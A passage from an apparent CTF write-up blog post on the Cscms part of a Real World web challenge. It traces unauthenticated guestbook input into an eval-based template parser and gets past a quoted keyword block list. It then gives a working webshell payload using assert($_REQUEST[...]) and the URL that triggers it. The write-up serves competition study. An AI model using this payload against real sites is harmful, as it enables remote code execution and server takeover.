+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PHP代码解析</span></span><br><span class="line">preg_match_all(<span class="string">'/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/'</span>,$str,$php_arr);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($php_arr[<span class="number">0</span>]))&#123;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($php_arr[<span class="number">0</span>]);$i++)&#123;</span><br><span class="line">	      $str=<span class="keyword">$this</span>-&gt;cscms_php($php_arr[<span class="number">0</span>][$i],$php_arr[<span class="number">1</span>][$i],$str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($php_arr);</span><br></pre></td></tr></table></figure>
+<p>也就是说正则匹配{cscmsphp}([\s\S]+?){/cscmsphp}，把匹配到的数据传给cscms_php，再利用eval直接执行，分析到这逻辑就很清晰了，就是要找一个前台的调用了template_parse函数的地方，控制输入的内容，就可以实现任意代码执行，全局搜索调用情况，定位一个好调用的地方：\plugins\sys\home\Gbook.php（意见留言板，不用任何权限直接触发），其中的ajax函数对其进行了调用</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Mark_Text</span>=<span class="variable">$this</span>-&gt;Csskins-&gt;template_parse(<span class="variable">$Mark_Text</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>也就是获取到留言板输入的内容，传入到template_parse函数中，所以我们构造留言数据的时候，加上{cscmsphp}{/cscmsphp}便签就会传到eval函数中，测试了下eval($_REQUEST[Cyc1e]);，然后失败了，尽然还有转义，也是很有意思，找到处理代码。<br> <figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = preg_replace('<span class="function"><span class="keyword">#</span><span class="params">(<span class="variable">alert</span>|<span class="variable">prompt</span>|<span class="variable">confirm</span>|<span class="variable">cmd</span>|<span class="variable">passthru</span>|<span class="variable">eval</span>|<span class="variable">exec</span>|<span class="variable">expression</span>|<span class="variable">system</span>|<span class="variable">fopen</span>|<span class="variable">fsockopen</span>|<span class="variable">file</span>|<span class="variable">file_get_contents</span>|<span class="variable">readfile</span>|<span class="variable">unlink</span>)</span></span>(\s*)\((.*?)\)#si','\\1\\2&amp;#40;\\3&amp;#41;',$str);</span><br></pre></td></tr></table></figure><br>就过滤了这几个，所以构造下payload：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：<span class="keyword">index</span>.php/gbook</span><br><span class="line">留言数据：&#123;cscmsphp&#125;assert($_REQUEST[Cyc1e]);&#123;/cscmsphp&#125;</span><br><span class="line">Shell：/<span class="keyword">index</span>.php/gbook/lists/<span class="number">1</span>?Cyc1e=phpinfo();</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-9f563edeb5d07a5b.png" alt></p>
+<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>总的来说，神仙打架，Web狗没前途，神仙们都不在意Web的那一丢丢分</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/cms/" rel="tag"><i class="fa fa-tag"></i> cms</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+              <a href="/tags/RealWorld/" rel="tag"><i class="fa fa-tag"></i> RealWorld</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" rel="prev" title="2019 强网杯部分Web题及解题思路">
+      <i class="fa fa-chevron-left"></i> 2019 强网杯部分Web题及解题思路
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" rel="next" title="Discuz ML V3.x 代码注入漏洞详细分析">
+      Discuz ML V3.x 代码注入漏洞详细分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https-pan-baidu-com-s-1WngiF9tTCMZq7SKqDaOa6g-提取码-kj7b）"><span class="nav-number">1.</span> <span class="nav-text">这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1WngiF9tTCMZq7SKqDaOa6g 提取码: kj7b）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-laravel"><span class="nav-number"></span> <span class="nav-text">0x01 laravel</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-YxtCmf"><span class="nav-number"></span> <span class="nav-text">0x02 YxtCmf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Cscms"><span class="nav-number"></span> <span class="nav-text">0x03 Cscms</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-小结"><span class="nav-number"></span> <span class="nav-text">0x04 小结</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cyc1e"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Cyc1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyc1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">176k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
